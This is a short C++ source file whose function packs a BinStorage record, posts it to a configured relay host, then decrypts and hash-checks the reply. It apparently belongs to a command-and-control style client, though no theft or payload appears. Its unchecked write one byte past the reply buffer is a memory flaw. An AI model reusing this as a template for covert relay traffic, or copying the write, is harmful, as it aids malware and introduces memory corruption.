#include "stdafx.h"
#include "Communicate.h"

BinStorage::STORAGE *Communicate(BinStorage::STORAGE *pReqStorage)
{
	DWORD dwPostDataSize;
	LPBYTE pPostData = BinStorage::Pack(pReqStorage, dwPostDataSize);

	HttpQuery::QueryInfo query_info;
	LPCTSTR lpszMethod = _T("POST");
	LPBYTE lpRetData = NULL;
	DWORD dwRetData = 0;

	BinStorage::STORAGE *pResStorage = NULL;

	BOOL bRet = HttpQuery::QuerfUrl(
		theRelayInfo.szHost, theRelayInfo.uPort, theRelayInfo.szPage,
		NULL,
		query_info,
		&lpRetData, &dwRetData,
		lpszMethod,
		pPostData, dwPostDataSize
		);
	if (TRUE == bRet)
	{
		BinStorage::Decrypt(theRelayInfo.szKey, lpRetData, dwRetData);
		lpRetData[dwRetData] = 0;
		pResStorage = (BinStorage::STORAGE*)lpRetData;
		if(pResStorage->size <= dwRetData && BinStorage::CheckHash(pResStorage))
		{
		}
		else
		{
			delete[] (LPBYTE)pResStorage;
			pResStorage = NULL;
		}
	}
	SAFE_DELETE_AR(pPostData);
	return pResStorage;
}